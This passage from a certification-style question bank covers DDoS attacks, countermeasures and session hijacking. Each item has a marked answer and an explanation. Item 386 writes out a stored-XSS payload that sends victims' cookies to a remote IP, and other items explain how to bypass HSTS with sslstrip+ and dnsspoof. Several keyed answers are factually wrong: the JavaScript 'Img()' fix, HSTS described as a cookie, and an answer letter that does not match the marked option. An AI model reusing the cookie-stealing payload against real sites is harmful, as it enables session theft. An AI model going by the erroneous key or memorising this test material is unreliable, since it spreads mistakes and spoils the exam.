+ [x] Application layer attack
+ [ ] Protocol attack
> **Explanation:**
> The answer is application layer DDoS attack, which includes GET/POST floods. This attacks that targets web server, application or OS vulnerabilities, Slowloris, and so on. It is not volume-based attack, which includes UDP floods, ICMP floods, and other spoofed-packet floods. It is not protocol attack, which includes SYN floods, fragmented packet attacks, ping of death, smurf DDoS, teardrop, land attack, and so on. It is not SYN flood since SYN flooding is a part of the protocol attack.

355. Which of the following is NOT a type of DDoS attack?
+ [ ] Volume (volumetric) attack
+ [x] Phishing attack
+ [ ] Application layer attack
+ [ ] Protocol attack
> **Explanation:**
> The answer is phishing attack as it is a type of social engineering attack not the type of DDoS attack.
> 
> Following are the types of DDoS attack:
> + **Application layer attack:** which includes GET/POST floods. These attacks that targets web server, application or OS vulnerabilities, Slowloris, and so on.
> + **Volume-based attack:** which includes UDP floods, ICMP floods, and other spoofed-packet floods.
> + **Protocol attack:** which includes SYN flood attacks, fragmented packet attacks, ping of death attacks, smurf DDoS attacks, teardrop attacks, land attack, and so on.

356. The DDoS tool used by anonymous in the so-called Operation Payback is called _______
+ [ ] BanglaDOS
+ [x] LOIC
+ [ ] Dereil
+ [ ] HOIC
> **Explanation:**
> LOIC is the first version of the tool and it was used in Operation Payback. HOIC is the second version of the tool with some additional features, and it was used in the Operation Megaupload. BanglaDos and Dereil do not have direct connection with anonymous group.

357. Identify the type of DDoS attack from the following diagram:

![](./Images/0357.png)

+ [ ] Permanent Denial-of-Service attack
+ [ ] Peer-to-Peer attack
+ [ ] Phlashing attack
+ [x] Distributed reflection denial-of-service (DRDoS) attack
> **Explanation:**
> A DRDoS attack, also known as a “spoofed” attack, involves the use of multiple intermediate and secondary machines that contribute to the actual DDoS attack against the target machine or application. The DRDoS attack exploits the TCP three-way handshake vulnerability.
> 
> This attack involves an attacker machine, intermediary victims (zombies), secondary victims (reflectors), and the target machine. The attacker launches this attack by sending requests to the intermediary hosts, which, in turn, reflects the attack traffic to the target.


## DoS/DDoS Countermeasures
358. Which of the following DoS attack detection techniques analyzes network traffic in terms of spectral components? It divides incoming signals into various frequencies and examines different frequency components separately.
+ [x] Wavelet-based Signal Analysis
+ [ ] Activity Profiling
+ [ ] Change-point Detection
+ [ ] Signature-based Analysis
> **Explanation:**
> This technique checks for individual components of the frequency present at a particular time and provides a description of those components. The presence of an unfamiliar frequency indicates suspicious network activity. A network signal consists of a time-localized data packet flow signal and background noise.
> 
> Wavelet-based signal analysis filters out the anomalous traffic flow input signals from background noise. Regular network traffic is generally low-frequency traffic. During an attack, the high-frequency components of a signal increase.

359. What is the DoS/DDoS countermeasure strategy to at least keep the critical services functional?
+ [x] Degrading services
+ [ ] Shutting down the services
+ [ ] Absorbing the attack
+ [ ] Deflecting attacks
> **Explanation:**
> During an attack, if it is not possible to keep all the services functioning, then it is a good idea to keep at least the critical services functional. To do this, first, identify the critical services and then customize the network, systems, and application designs to cut down on the noncritical services. This may help you to keep the critical services functional.

360. Which of the following DoS/DDoS countermeasures strategy can you implement using a honeypot?
+ [x] Deflecting attacks
+ [ ] Degrading services
+ [ ] Absorbing attacks
+ [ ] Mitigating attacks
> **Explanation:**
> Honeypots are intentionally set up with low security to gain the attention of the DDoS attackers. A honeypot attracts DDoS attackers, in that they will install handlers or agent code within the honeypot. This avoids compromising of more sensitive systems. Honeypots not only protect the actual system from attackers but also keep track of details about what the attackers are doing by storing the information in a record. This gives the owner of the honeypot a way to keep a record of handler and agent activity. Users can use this knowledge to defend against any future DDoS attacks.

361. Which of the following is an attack detection technique that monitors the network packet’s header information? This technique also determines the increase in overall number of distinct clusters and activity levels among the network flow clusters?
+ [x] Activity profiling
+ [ ] Sequential Change-point detection
+ [ ] Ping of death attack
+ [ ] Wavelet-based signal analysis
> **Explanation:**
> Activity profiling is done based on the average packet rate for a network flow, which consists of consecutive packets with similar packet header information. Packet header information includes the destination and sender IP addresses, ports, and transport protocols used.
> 
> Wavelet-based signal analysis denotes an input signal in terms of spectral components. Sequential change-point detection can be used to identify the typical scanning activities of network worms. Ping of death attack is a type of ICMP attack.

362. Ivan works as security consultant at “Ask Us Intl.” One of his clients is under a large-scale protocol-based DDoS attack, and they have to decide how to deal with this issue. They have some DDoS appliances that are currently not configured. They also have a good communication channel with providers, and some of the providers have fast network connections. In an ideal scenario, what would be the best option to deal with this attack. Bear in mind that this is a protocol-based DDoS attack with at least 10 000 bots sending the traffic from the entire globe!
+ [x] Block the traffic at the provider level
+ [ ] Absorb the attack at the client site
+ [ ] Filter the traffic at the company Internet facing routers
+ [ ] Absorb the attack at the provider level
> **Explanation:**
> The answer is “Block the traffic at the provider level,” since the provider can easily block specific protocols, thereby effectively preventing traffic to reach the client’s site. Absorbing the traffic is not the answer, since this is not the best solution in this case (provider level or client site). Filtering the traffic at the company’s Internet facing routers is an option, but the best thing to do is to filter the traffic as high as possible, and since in this case, we do have a good communication channel with the provider(s), we will not use the filtering at client site.

363. Ivan works as security consultant at “Ask Us Intl.” One of his clients is under a large-scale application layer-based DDoS attack, and they have to decide how to deal with this issue. Web application under attack is being used to send the user filled forms and save the data in MySQL database. Since the DDoS is abusing POST functionality, not only web application and web server are in DDoS condition but also MySQL database is in DDoS condition.
They have some DDoS appliances that are currently not configured. They also have good communication channel with providers, and some of the providers have fast network connections. In an ideal scenario, what would be the best option to deal with this attack. Bear in mind that this is an application layer-based DDoS attack which sends at least 1000 malicious POST requests per second spread through the entire globe!
+ [x] Use CAPTCHA
+ [ ] Filter the traffic at the company Internet facing routers
+ [ ] Absorb the attack at the client site
+ [ ] Absorb the attack at the provider level
> **Explanation:**
> The answer is “Use CAPTCHA.” CAPTCHA is a challenge-response type test implemented by the web applications to ensure whether the response is generated by the computer or not. By using strong CAPTCHAs (assuming the CAPTCHA is not easily solvable in code), 1000 malicious POSTs per second will be effectively blocked. The answer is not absorbing the traffic, since this is not the best solution in this case (provider level or client site) because it is difficult to separate malicious from legitimate traffic. Filtering the traffic at the company’s Internet facing routers is not an option because it is difficult to separate malicious from legitimate traffic.

364. Ivan works as security consultant at “Ask Us Intl.” One of his clients is under a large-scale volume-based DDoS attack, and they have to decide how to deal with the issue. They have some DDoS appliances that are currently not configured. They also have a good communication channel with providers, and some of the providers have fast network connections. In an ideal scenario, what would be the best option to deal with this attack. Bear in mind that this is a volume-based DDoS attack with at least 1 000 000 bots sending the traffic from the entire globe!
+ [ ] Block the traffic at the provider level
+ [ ] Filter the traffic at the company's internet facing routers
+ [x] Absorb the attack
+ [ ] Filter the traffic at the provider level
> **Explanation:**
> The answer is “Absorb the attack,” since this is a really large volume of traffic, and using additional capacity (DDoS appliances that are currently not configured) to absorb the attack. Most of the other options are not practically feasible. Blocking the traffic at the provider level is a viable option, but in this case, since the attack cannot be easily filtered (Since the traffic coming from the entire globe), this is not an apt solution. Filtering the traffic at the provider level is the same thing as blocking the traffic at the provider level, so this is not a correct answer and filtering the traffic at the company’s Internet facing routers option will not work because the traffic is already there, and in this case, it is impossible to do anything at the client’s site.

365. John’s company is facing a DDoS attack. While analyzing the attack, John has learned that the attack is originating from the entire globe, and filtering the traffic at the Internet Service Provider’s (ISP) level is an impossible task to do. After a while, John has observed that his personal computer at home was also compromised similar to that of the company’s computers. He observed that his computer is sending large amounts of UDP data directed toward his company’s public IPs.
John takes his personal computer to work and starts a forensic investigation. Two hours later, he earns crucial information: the infected computer is connecting to the C&C server, and unfortunately, the communication between C&C and the infected computer is encrypted. Therefore, John intentionally lets the infection spread to another machine in his company’s secure network, where he can observe and record all the traffic between the Bot software and the Botnet. After thorough analysis he discovered an interesting thing that the initial process of infection downloaded the malware from an FTP server which consists of username and password in cleartext format. John connects to the FTP Server and finds the Botnet software including the C&C on it, with username and password for C&C in configuration file. What can John do with this information?
+ [ ] Protect Secondary Victims
+ [x] Neutralize handlers
+ [ ] Deflect the attack
+ [ ] Mitigate the attack
> **Explanation:**
> The correct answer is “neutralize handlers,” because with admin’s access to C&C John can stop the attack, disable the C&C software, and/or change the password to stop the DDoS attack on his company’s network. Deflect the attack and mitigate the attack are not the correct answers because in both these cases, he is literally stopping the attack. Protect secondary victims is not the correct answer because secondary victims are still infected.

366. John’s company is facing a DDoS attack. While analyzing the attack, John has learned that the attack is originating from entire globe and filtering the traffic at the Internet Service Provider’s (ISP) level is an impossible task to do. After a while, John has observed that his personal computer at home was also compromised similar to that of the company’s computers. He observed that his computer is sending large amounts of UDP data directed toward his company’s public IPs.
John takes his personal computer to work and starts a forensic investigation. Two hours later, he earns crucial information: the infected computer is connecting to the C&C server, and unfortunately, the communication between C&C and the infected computer is encrypted. Therefore, John intentionally lets the infection spread to another machine in his company’s secure network, where he can observe and record all the traffic between the Bot software and the Botnet. After thorough analysis he discovered an interesting thing that the initial process of infection downloaded the malware from an FTP server which consists of username and password in cleartext format. John connects to the FTP Server and finds the Botnet software including the C&C on it, with username and password for C&C in configuration file. What can John do with this information?
After successfully stopping the attack against his network, John connects to the C&C again, dumps all the IPs the C&C is managing, and sends this information to the national CERT. What is John trying to do?
+ [ ] Deflect the attack
+ [ ] Neutralize handlers
+ [x] Protect secondary victims
+ [ ] Mitigate the attack
> **Explanation:**
> The correct answer is “Protecting secondary victims” because the CERT will try to inform all the infected computer owners (or at least providers) that their computers are infected. If the IP in question is not in this CERTs jurisdiction, they will send the information to the CERT “in charge” for this IP address range. Not all the users will be directly contacted, but ISP could block specific traffic flowing from infected computers.
> 
> John is not trying to neutralize handlers, he already did that by stopping the attack, and he is not trying to deflect or mitigate the attack.

367. John’s company is facing a DDoS attack. While analyzing the attack, John has learned that the attack is originating from the entire globe, and filtering the traffic at the Internet Service Provider’s (ISP) level is an impossible task to do. After a while, John has observed that his personal computer at home was also compromised similar to that of the company’s computers. He observed that his computer is sending large amounts of UDP data directed toward his company’s public IPs.
John takes his personal computer to work and starts a forensic investigation. Two hours later, he earns crucial information: the infected computer is connecting to the C&C server, and unfortunately, the communication between C&C and the infected computer is encrypted. Therefore, John intentionally lets the infection spread to another machine in his company’s secure network, where he can observe and record all the traffic between the Bot software and the Botnet. After thorough analysis he discovered an interesting thing that the initial process of infection downloaded the malware from an FTP server which consists of username and password in cleartext format. John connects to the FTP Server and finds the Botnet software including the C&C on it, with username and password for C&C in configuration file. What can John do with this information?
After successfully stopping the attack against his network, and informing the CERT about the Botnet and new password which he used to stop the attack and kick off the attackers from C&C, John starts to analyze all the data collected during the incident and creating the so-called “Lessons learned” document. What is John doing?
+ [ ] Neutralize the handlers
+ [ ] Protect secondary victims
+ [x] Postattack forensics
+ [ ] Prevent potential attacks
> **Explanation:**
> John is trying the postattack forensics in order to learn how to fight this type of attacks in the future. John is not trying to neutralize the handlers because this requires some type of access to C&C, which was already done, and he is not trying to prevent potential attacks and protect secondary victims—this was already done in previous steps.

368. Sarah is facing one of the biggest challenges in her career—she has to design the early warning DDoS detection techniques for her employer. She starts developing the detection technique which uses signal analysis to detect anomalies. The technique she is employing analyzes network traffic in terms of spectral components where she divides the incoming signals into various frequencies and analyzes different. Which DDoS detection technique is she trying to implement?
+ [ ] NetFlow detection
+ [ ] Change-point detection
+ [x] Wavelet-based signal analysis
+ [ ] Activity profiling
> **Explanation:**
> The correct answer is “Wavelet-based signal analysis” because this technique divides the signal in spectral components and analyzes it. The wavelet analysis technique analyzes network traffic in terms of spectral components. It divides incoming signals into various frequencies and analyzes different frequency components separately. Analyzing each spectral window’s energy determines the presence of anomalies. These techniques check frequency components present at a specific time and provide a description of those components. Presence of an unfamiliar frequency indicates suspicious network activity.
> 
> It is not activity profiling technique since this technique monitors the network’s packet header information and identifies increase in specific type of traffic.
> 
> Change-point detection technique filters network traffic by IP addresses, targeted port numbers, and communication protocols used, and stores the traffic flow data in a graph that shows the traffic flow rate versus time.
> 
> NetFlow detection could be a part of activity profiling, but it is not used as a self-contained DDoS detection technique.

369. Which algorithm does the “sequential change-point detection” technique use to identify and locate the DoS attacks?
+ [ ] Advanced Encryption Standard
+ [x] Cumulative Sum
+ [ ] Obfuscation
+ [ ] BlackShades
> **Explanation:**
> The cumulative sum control chart (CUSUM) is a sequential analysis technique developed by E. S. Page of the University of Cambridge. It is typically used in monitoring change detection. The sequential change-point detection technique filters network traffic by IP addresses, targeted port numbers, and communication protocols used, and stores the traffic flow data in a graph that shows the traffic flow rate versus time. Change-point detection algorithms isolate changes in network traffic statistics and in traffic flow rate caused by attacks. If there is a drastic change in traffic flow rate, a DoS attack may be occurring. This technique uses Cumulative Sum (Cusum) algorithm to identify and locate the DoS attacks; the algorithm calculates deviations in the actual versus expected local average in the traffic time series. The sequential change-point detection technique identifies the typical scanning activities of the network worms.
> 
> Obfuscation is the obscuring of the intended meaning of communication by making the message difficult to understand, usually with confusing and ambiguous language. BlackShades is the name of a malicious Trojan horse used by hackers to control computers remotely. The Advanced Encryption Standard (AES) is a symmetric block cipher chosen by the U.S. Government to protect classified information and is implemented in software and hardware throughout the world to encrypt sensitive data.

370. Which of the following is an attack detection technique that monitors the network packet’s header information? This technique also determines the increase in overall number of distinct clusters and activity levels among the network flow clusters?
+ [x] Activity profiling
+ [ ] Sequential Change-point detection
+ [ ] Ping of death attack
+ [ ] Wavelet-based signal analysis
> **Explanation:**
> Activity profiling is done based on the average packet rate for a network flow, which consists of consecutive packets with similar packet header information. Packet header information includes the destination and sender IP addresses, ports, and transport protocols used.
> 
> Wavelet-based signal analysis denotes an input signal in terms of spectral components. Sequential change-point detection can be used to identify the typical scanning activities of network worms. Ping of death attack is a type of ICMP attack.

# 11. Session Hijacking
## Session Hijacking Concepts
371. Which of the following is considered to be a session hijacking attack?
+ [x] Taking over a TCP session
+ [ ] Monitoring a UDP session
+ [ ] Taking over a UDP session
+ [ ] Monitoring a TCP session
> **Explanation:**
> Taking over a TCP session is one of the most common session hijacking sessions and is the correct answer. All other options are not correct.

372. When a person (or software) steals, can calculate, or can guess part of the communication channel between client and the server application or protocols used in the communication, he can hijack the ______.
+ [x] Session
+ [ ] TCP protocol
+ [ ] Channel
+ [ ] UDP protocol
> **Explanation:**
> The correct answer is session (session hijacking). Channel hijacking is not the correct term used for this and TCP/UDP protocol hijacking is just a subset of the answer.

373. An attacker is using session hijacking on the victim system to perform further exploitation on the target network. Identify the type of attacks an attacker can perform using session hijacking?
+ [x] Sniffing
+ [ ] Piggybacking
+ [ ] Tailgating
+ [ ] Dumpster Diving
> **Explanation:**
> + **Sniffing:** It is a process of monitoring and capturing all data packets passing through a given network by using a software application or a hardware device
> + **Piggybacking:** It usually implies entry into the building or security area with the consent of the authorized person.
> + **Dumpster Diving:** It is the process of retrieving sensitive personal or organizational information by searching through trash bins.
> + **Tailgating:** It implies access to a building or secured area without the consent of the authorized person.

374. During a penetration test, Marin identified a web application that could be exploited to gain a root shell on the remote machine. The only problem was that in order to do that he would have to know at least one valid username and password that could be used in the application. Unfortunately, guessing usernames and brute-forcing passwords did not work. Marin does not want to give up his attempts. Since this web application is being used by almost all users in the company, and moreover it was using the http protocol, so he decided to use the Cain & Abel tool in order to identify at least one username and password. Marin found that the network was using layer 2 switches with no configuration or management features.
Which of the following attack will help Marin to do this?
+ [x] MitM (Man in the Middle)
+ [ ] MitB (Man in the Browser)
+ [ ] Cross-site Scripting attack
+ [ ] DoS attack
> **Explanation:**
> The correct answer is MitM (Man in the Middle). Since the network was using layer 2 switches with no configuration or management features, Marin can sniff the network and capture the required details from the network traffic using Cain and Abel tool.
> 
> MitB (Man in the Browser) is not the correct answer because it is used in attacks where the attacker has access to the user computer.

375. During the penetration testing, Marin identified a web application that could be exploited to gain the root shell on the remote machine. The only problem was that in order to do that he would have to know at least one username and password usable in the application. Unfortunately, guessing usernames and brute-forcing passwords did not work. Marin does not want to give up his attempts. Since this web application,was being used by almost all users in the company and was using http protocol, so he decided to use Cain & Abel tool in order to identify at least one username and password. After a few minutes, the first username and password popped-up and he successfully exploited the web application and the physical machine. What type of attack did he use in order to find the username and password to access the web application?
+ [x] ARP spoofing
+ [ ] DNS spoofing
+ [ ] UDP protocol hijacking
+ [ ] TCP protocol hijacking
> **Explanation:**
> + ARP spoofing is the correct answer, and since there are no configuration or management options on switches it means that there is no ARP spoofing protection.
> + DNS spoofing is more complex and it is never the first option.
> + TCP and UDP protocol hijacking does not make any sense here – after ARP spoofing all the traffic will be hijacked.

376. During a penetration test, Marin exploited a blind SQLi and exfiltrated session tokens from the database. What can he do with this data?
+ [ ] Marin can do XSS (Cross-Site Scripting)
+ [x] Marin can do Session hijacking
+ [ ] Marin can do SQLi (SQL injection)
+ [ ] Marin can do CSRF (Cross-Site Request Forgery)
> **Explanation:**
> + The correct answer is that Marin can do a Session Hijacking attack, by using the session IDs. A session hijacking attack refers to the exploitation of a session-token generation mechanism or token security controls so that the attacker can establish an unauthorized connection with a target server.
> + He would have used SQLi for the initial exfiltration of the session data.
> + He could use XSS in another scenario to steal the session data, but he already has it.
> + CSRF is not applicable to this scenario, since it requires user interaction or active XSS attack.

377. MitB (Man in the Browser) is a session hijacking technique heavily used by e-banking Trojans. The most popular ones are Zeus and Gameover Zeus. Explain how MitB attack works.
+ [ ] Malware is injected between the browser and keyboard driver, enabling to see all the keystrokes.
+ [x] Malware is injected between the browser and OS API, enabling to see the data before encryption (when data is sent from the machine) and after decryption (when data is being received by the machine).
+ [ ] Man-in-the-Browser is just another name for sslstrip MitM attack.
+ [ ] Malware is injected between the browser and network.dll, enabling to see the data before it is sent to the network and while it is being received from the network.
> **Explanation:**
> On Windows OS, malware is injected between the browser and wininet.dll, which allows it to see the data before encryption (wininet.dll is exposing APIs to use https etc.)

378. In order to hijack TCP traffic, an attacker has to understand the next sequence and the acknowledge number that the remote computer expects. Explain how the sequence and acknowledgment numbers are incremented during the 3-way handshake process.
+ [ ] Sequence number is not incremented and acknowledgment number is incremented by one during the 3-way handshake process
+ [ ] Sequence number is incremented by one and acknowledge number is not incremented during the 3-way handshake process
+ [x] Sequence and acknowledgment numbers are incremented by one during the 3-way handshake process
+ [ ] Sequence and acknowledgment numbers are incremented by two during the 3-way handshake process
> **Explanation:**
> During the 3-way handshake, sequence and acknowledgment numbers are (relatively) incremented by one. After that acknowledge number will be incremented for the size of the packet received.

379. During the penetration test, Marin is using the MITMF tool to inject the arbitrary data into an HTTP communication channel between the clients on the internal network and web servers in order to steal the cookies and, if possible, establish a remote shell on the victim’s computer. He successfully injects XSS JavaScript into the session, and with BeeF he has a control over the user browser, as shown in the following images.
Command used with the MITMF tool:

![](./Images/0379-1.png)

BeeF hook achieved:

![](./Images/0379-2.png)

There is no 0-day vulnerability against the client browser (at least not the one Marin knows about). Is it possible to gain the remote shell access to the remote machine without browser/javascript/flash etc. vulnerability?
+ [ ] Yes. There is an exploit in BeeF that always works; afterall Marin has access to the remote browser
+ [ ] No. Marin needs 0 day in order to escalate to remote shell
+ [x] Yes. Marin can try to use social engineering attacks (like “Fake Flash Update”), and try to fool the user into clicking on the malicious payload
+ [ ] No. This is impossible to be done over XSS and BeeF
> **Explanation:**
> The correct answer is “Yes. Marin can try to use social engineering attacks (like “Fake Flash Update”), and try to fool the user into clicking on the malicious payload”. If the user is naïve enough, Marin can always make him click on malicious payload with social engineering payloads in BeeF. There is no magical exploit that always works even if there is no 0-day.

380. Marin is a penetration tester in XYZ organization and while performing penetration testing using MITMF tool, he captured the Microsoft NTLMv2 hash file as shown in the screenshot.

![](./Images/0380.png)

What can Marin do with it?
+ [ ] Marin can crack it with rainbow tables
+ [ ] Marin cannot crack it since it’s salted
+ [x] Marin can try to crack it
+ [ ] Marin can use it in the pass-the-hash attack
> **Explanation:**
> + NTLMv2 is a is a default authentication scheme that performs authentication using a challenge/response strategy. Marin can try to crack it since NTLMv2 hash can be cracked with a dictionary or brute-force.
> + It cannot be cracked with rainbow tables because it’s salted.
> + It cannot be used in pass-the-hash attack.


## Application Level Session Hijacking
381. Until a few years ago, most of the websites (including highly exposed ones like Facebook, Twitter, Gmail) used a secure (https) connection only during the logon process, after which they switched back to insecure (http) connection. One of the tools FireSheep exploited this behaviour in order to steal user session and effectively educate the public that a secure connection was required to be used from the first to the last packet of connection. The attack this tool was using is called________________________.
+ [x] Session hijacking
+ [ ] Session piggybacking
+ [ ] Session duplicating
+ [ ] Session splicing
> **Explanation:**
> + The correct answer is “Session hijacking” since steal user session is a part of Session hijacking attack.
> + Session splicing represents IDS evasion technique
> + Session duplicating and session piggybacking are not correct terms for this. They are the end-result of application session hijacking.

382. Marin was using sslstrip tool for many years against most of the websites, like Gmail, Facebook, Twitter, etc. He was supposed to give a demo on internet (in)security and wanted to show a demo where he can intercept 302 redirects between his machine and Gmail server. But unfortunately it does not work anymore. He tried the same on Facebook and Twitter and the result was the same. He then tried to do it on the company OWA (Outlook Web Access) deployment and it worked! He now wants to use it against Gmail in his demo because CISO thinks that security through obscurity is a best way to a secure system (obviously BAD CISO) and demonstrating something like that on company live system is not allowed. How can Marin use sslstrip or similar tool to strip S from HTTP?
+ [ ] Marin can use sslstripHSTS tool to do this.
+ [ ] There is no option which will allow Marin to do that, since HSTS prevents this type of attacks.
+ [x] Marin can use mitmf tool with sslstrip+ and dnsspoof modules. He should use IE in “InPrivate browsing” mode to ignore the HSTS cookie if the cookie was already stored on his machine, or he can use some older browser version (IE, Firefox, Chrome, Safari, Opera, …) which didn’t use the HSTS cookies.
+ [ ] Marin can use mitmf tool with sslstrip+ and dnsspoof modules. He can use any web browser he wants because sslstrip+ can go around HSTS without any additional tool or setting.
> **Explanation:**
> HSTS protection is basically the cookie that the website issues to the web browser, when user visits the website for the first time. It’s long term cookie, which means that it will not expire. If the cookie is set – web browser prevents visiting the website over HTTP connection. So, by using sslstrip+ with dnsspoof module, one can effectively combat the protection if the user NEVER visited this website before. That’s why he has to use IE in InPrivate browsing mode because it will not read the HSTS cookie. This is NOT the case with Firefox or Chrome though!
> 
> SslstripHSTS tool does not exist.

383. During a penetration test, Marin discovered that a web application does not change the session cookie after successful login. Instead, the cookie stays the same and is allowed additional privileges. This vulnerability and application-level session hijacking is called ______________.
+ [x] Session fixation
+ [ ] Predictable session token
+ [ ] Session replay attack
+ [ ] Session sniffing
> **Explanation:**
> Session fixation is the correct answer. It is the vulnerability where the user can connect to the server, receive the cookie, and then try to use this cookie in social engineering or some other attack, provoking the user to login. When the user logs in, the session becomes active and the attacker has access to the user session even without knowing the username and password.

384. During a penetration test, Marin discovered a session token that had had the content: 20170801135433_Robert. Why is this session token weak, and what is the name used for this type of vulnerability?
+ [ ] Unknown Session Token
+ [ ] Captured Session Token
+ [x] Predictable Session Token
+ [ ] Date/Time Session Token
> **Explanation:**
> Compromising Session IDs by Predicting Session Token
> 
> A session ID is tagged as a proof of the authenticated session established between a user and a Web server. Thus, if an attacker is able to guess or predict the session ID of the user, fraudulent activity is possible. Session prediction enables an attacker to bypass the authentication schema of an application. Usually, attackers can predict session IDs generated by weak algorithms and impersonate a website user. Attackers perform analysis of variable section of session IDs to determine the existence of a pattern. She/he performs this analysis either manually or by using various cryptanalytic tools.
> 
> The correct answer is “predictable session token,” which means that someone can easily guess the possible token combinations. Iterating through possible combinations, attacker will (in this case) stumble upon active session in no time.

385. Marin is performing penetration testing on the target organization. He discovered some vulnerabilities in the organization’s website. He decided to insert malicious JavaScript code into a vulnerable dynamic web page to collect information such as credentials, cookies, etc. Identify the attack performed by Marin?
+ [ ] Cross-site Request Forgery Attack
+ [ ] Man-in-the-Browser Attack
+ [ ] Session Replay Attack
+ [x] Cross-site Scripting Attack
> **Explanation:**
> This is XSS attack and it will send session cookie to the remote IP in the parameter, giving the attacker active users session.
> + **Cross-Site Scripting Attack:** A cross-site script attack is a client-side attack in which the attacker compromises the session token by making use of malicious code or programs. This type of attack occurs when a dynamic Web page gets malicious data from the attacker and executes it on the user’s system. Websites that create dynamic pages do not have control over how the clients read their output. Thus, attackers can insert a malicious JavaScript, VBScript, ActiveX, HTML, or Flash applet into a vulnerable dynamic page. That page will then execute the script on the user’s machine and collect personal information of the user, steal cookies, redirect users to unexpected Web pages, or execute any malicious code on the user’s system.
> + **Cross-site Request Forgery Attack:** Cross-site Request Forgery (CSRF), also known as a one-click attack or session riding, exploits victim’s active session with a trusted site to perform malicious activities such as purchase an item, modify, or retrieve account information. In CSRF web attacks, an attacker forces the victim to submit the attacker’s form data to the victim’s Web server. The attacker creates the host form, containing malicious information, and sends it to the authorized user. The user fills in the form and sends it to the server. Because the data is coming from a trusted user, the Web server accepts the data.
> + **Session Replay Attack:** In a session replay attack, the attacker listens to the conversation between the user and the server and captures the authentication token of the user. Once the authentication token is captured, the attacker replays the request to the server with the captured authentication token to dodge the server and gains unauthorized access to the server.
> + **Man-in-the-Browser Attack:** A man-in-the-browser attack is similar to that of a man-in-the-middle attack. The difference between the two techniques is that the man-in-the-browser attack uses a Trojan horse to intercept and manipulate calls between the browser and its security mechanisms or libraries. An attacker uses previously installed Trojan to act between the browser and its security mechanism, capable of modifying web pages, and modifying transaction content or inserting additional transactions, everything invisible to both the user and web application.

386. Luka is a black hat hacker trying to compromise a victim’s computer session. The attack he is trying to do is called stored XSS, and he is expecting to see an active user’s session tokens in his web server logs. The command that Luka is using is given below:
`<script>new image().src="http://192.168.111.111/?a="+document.cookie<script>`
What is wrong with this command?
+ [x] This is JavaScript, and Java is a case-sensitive language, so img has to be written with uppercase I, like this: `Img().src`, and `<script>` tag is not correctly closed it has to be closed like this:`</script>`
+ [ ] This is JavaScript, and Java is a case sensitive language, so img has to be written with uppercase I, like this: `Img().src`.
+ [ ] `<script>` tag is not correctly closed it has to be closed like this: `</script>`
+ [ ] Everything is OK with this code—Luka did not start the web server, that is why either he did not receive any user session data, or the IP in the command was wrong, or there was a firewall blocking the traffic.
> **Explanation:**
> JavaScript is case sensitive and the tag `<script>` is not correctly closed.

387. During the penetration testing of e-banking application, Marin is using burp to analyze the traffic. Unfortunately intercepting the traffic between the website and the browser that Marin is testing does not work with his burp installation. Website is using HSTS (HTTP Strict Transport Security).
What can Marin do to fix this issue?
+ [ ] Marin has to install burp certificate into trusted CA’s in order to intercept the traffic between website protected with HSTS. He can do that automatically by configuring web browser with burp as the proxy server and then navigating to https://burp website
+ [ ] That’s impossible. HSTS prevents any type of MitM or traffic analysis
+ [ ] Marin has to install burp certificate into trusted CA’s in order to intercept the traffic between website protected with HSTS. He can do that automatically by navigating to https://burp website
+ [x] Marin has to install burp certificate into trusted CA’s in order to intercept the traffic between website and the browser is protected with HSTS. He can do that by configuring the web browser with burp as the proxy server and then navigating to https://burp website. There he has to download burp CA certificate and install it in browser trust pool.
> **Explanation:**
> After configuring the browser to use burp as a proxy, one has to navigate to http://burp or https://burp website. Then click on the “CA certificate” link and save the file. The process that follows is different for different browsers. For instance, in Firefox one has to click on Preferences/Advanced/Certificates/View certificates, click the import button, choose downloaded file and click open. Then one has to choose “Trust this CA to identify websites” and click OK.

388. A session hijacking attack that gains control over the HTTP’s user session by obtaining the session IDs, is known as_______________.
+ [ ] Passive attack
+ [x] Application Level Hijacking
+ [ ] Active hijacking
+ [ ] Network Level Hijacking
> **Explanation:**
> Application Level Hijacking invokes gaining control over HTTP’s user session by obtaining the session IDs. Network level hijacking invokes the interception of the packets during transmission in a TCP and UDP session between a server and client communication. Active and Passive attacks options are incorrect.

389. During the penetration testing in company “Credit Cards Rus Ltd.” Marin was using the sslstrip tool in order to sniff HTTPS traffic. Knowing that HTTPS traffic is encrypted and cannot be sniffed normally, explain the reason why it is possible to see the traffic in cleartext.
+ [ ] Sslstrip tool is exploiting network bug, which allows it to decrypt HTTPS protocols (TLS and SSL) by sending gratuitous ARP packets to all the nodes on the network
+ [ ] Sslstrip tool is exploiting an older or in HTTPS protocol, allowing it to gracefully decrypt http traffic by intercepting HTTP 403 denied messages and sending user HTTP 200 OK messages
+ [x] Sslstrip tool is exploiting user behavior and if a user does not type https:// in front of the link, and the website has redirection from HTTP to HTTPS, it will intercept HTTP 302 redirection and send the user exactly what the user asked for, i.e. HTTPsite
+ [ ] Sslstrip tool is exploiting certificate signing and it is sending its own certificate instead of the original one, allowing for the traffic to be easily decrypted
> **Explanation:**
> The correct answer is “a” because sslstrip is intercepting 302 REDIRECT messages if the traffic is not initially encrypted. If the traffic is initially encrypted because the user has typed https:// in front of the link – Sslstrip cannot see the traffic.

390. Marin was using sslstrip tool for many years against most of the websites, like Gmail, Facebook, Twitter, etc. He was supposed to give a demo on internet (in)security and wanted to show a demo where he can intercept 302 redirects between his machine and Gmail server. But unfortunately it does not work anymore. He tried the same on Facebook and Twitter and the result was the same. He then tried to do it on the company OWA (Outlook Web Access) deployment and it worked! He now wants to use it against Gmail in his demo because CISO thinks that security through obscurity is a best way to a secure system (obviously BAD CISO) and demonstrating something like that on company live system is not allowed. How can Marin use sslstrip or similar tool to strip S from HTTP?
+ [ ] Marin can use sslstripHSTS tool to do this.
+ [ ] Marin can use mitmf tool with sslstrip+ and dnsspoof modules. He can use any web browser he wants because sslstrip+ can go around HSTS without any additional tool or setting.
+ [x] Marin can use mitmf tool with sslstrip+ and dnsspoof modules. He should use IE in “InPrivate browsing” mode to ignore the HSTS cookie if the cookie was already stored on his machine, or he can use some older browser version (IE, Firefox, Chrome, Safari, Opera, …) which didn’t use the HSTS cookies.
+ [ ] There is no option which will allow Marin to do that, since HSTS prevents this type of attacks.
> **Explanation:**
> HSTS protection is basically the cookie that the website issues to the web browser, when user visits the website for the first time. It’s long term cookie, which means that it will not expire. If the cookie is set – web browser prevents visiting the website over HTTP connection. So, by using sslstrip+ with dnsspoof module, one can effectively combat the protection if the user NEVER visited this website before. That’s why he has to use IE in InPrivate browsing mode because it will not read the HSTS cookie. This is NOT the case with Firefox or Chrome though!
> 
> SslstripHSTS tool does not exist.

391. Marin is using the mitmf tool during a penetration test and after few minutes this is what pops up on the screen.

![](./Images/0391-1.png)

